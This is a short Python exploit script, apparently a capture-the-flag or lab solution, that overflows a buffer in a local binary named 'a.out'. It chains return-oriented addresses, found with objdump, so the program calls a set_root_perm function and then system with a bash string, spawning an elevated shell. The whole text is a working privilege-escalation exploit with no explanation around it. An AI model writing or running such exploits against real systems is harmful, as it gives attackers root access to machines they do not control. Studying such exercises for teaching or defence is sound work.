#!/usr/bin/python

import os
import struct

# These values were found with `objdump -d a.out`.
pop_ret = 0x804925e
system = 0x8049070
set_root_perm = 0x80491bf
bash = 0x804a00c

# First, the buffer overflow.
payload =  "A"*0x6c
payload += "BBBB"

payload += struct.pack("I", set_root_perm)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0x11111111)

payload += struct.pack("I", system)
payload += "CCCC"
payload += struct.pack("I", bash)
os.system("./a.out {}".format(payload))
